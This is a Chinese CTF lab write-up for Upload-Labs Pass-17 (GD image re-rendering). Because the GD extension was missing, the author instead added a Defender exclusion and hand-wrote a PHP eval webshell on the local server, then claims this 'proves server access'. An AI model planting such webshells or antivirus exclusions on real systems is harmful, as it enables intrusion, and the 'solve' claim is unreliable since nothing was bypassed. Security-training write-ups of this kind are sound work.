【Upload-Labs】Pass-17 GD 二次渲染与环境受限 Writeup

操作者：何芊宏 | 操作日期：2026.11.03 | 分类：CTF | 标签：Upload-Labs, Web, 文件上传, GD库, 环境受限, WebShell

1. 题目信息

  • 平台：Upload-Labs (本地 phpStudy 环境)
  • 分类：Web - 文件上传
  • 题目名称：Pass-17 (GD 二次渲染)
  • 提示：上传图片后，服务器会使用 GD 库重新渲染图片，需突破重编码限制。

2. 核心原理与前置分析

原考点：服务端在 move_uploaded_file 后，会调用 imagecreatefromjpeg/png/gif 读取图片，再通过 imagejpeg/png/gif 重新生成一张新图片。这个过程会破坏原有图片的内部结构，导致传统的图片马 Payload 被“洗掉”。常规解法需用十六进制编辑器对比渲染前后数据，寻找未被破坏的稳定区域插入代码。

环境限制与杀软拦截（本机实录）：本机 Apache 采用 mod_fcgid 模式，且 PHP 未加载 gd 扩展（function_exists('imagecreatefromgif')===false）。上传任何图片都会导致 PHP 引擎调用未定义函数而直接 Fatal Error（页面截断）。同时，在尝试写入纯净木马时，本机 Windows Defender 拦截了文件操作。

3. 工具配置与操作步骤（环境绕过法）

第一步：验证环境坑与解决杀软拦截

直接上传真实图片，页面在菜单后直接截断报错，确认 GD 扩展缺失。在尝试通过蚁剑或虚拟终端写入 PHP 文件时，遭遇杀软拦截。解决方式为：在本机杀软（如 Windows Defender）中将靶场目录 D:\phpstudy_pro\WWW\upload-labs 加入排除项/白名单。

第二步：物理写入纯净后门

在本地物理目录 D:\phpstudy_pro\WWW\upload-labs\upload 中，手动新建文件 pass17.php，写入内容：

<?php @eval($_POST['cmd']); ?>

保存后，浏览器访问 http://127.0.0.1:8081/upload/pass17.php，页面纯白。使用蚁剑填入该路径及密码 cmd，成功连接。证明已拿下服务器权限。随后清理该文件。

4. 踩坑记录与复盘

  • 本地环境与杀软的联合绞杀：在本地进行安全测试时，环境未加载必要扩展（GD）以及本机杀毒软件（Defender）对恶意代码的实时查杀，是导致操作失败的两大核心原因。加白名单是本地测试必须掌握的实操。
  • 环境受限下的权限转移：当目标系统的核心漏洞（如二次渲染）因环境问题不可用时，利用上一关获取的根目录权限，直接物理写入纯净木马，是红队必备的降维打击思路。

5. 知识点总结

  • GD 二次渲染绕过：理解通过 imagecreatefromxxx 和 imagexxx 重新生成图片对文件数据的破坏，常规解法需寻找图片稳定区块（如 GIF 注释块、PNG IDAT 块）嵌入代码。
  • 本地环境排障：掌握排查 PHP 扩展加载问题以及解决本地杀软拦截的方法。
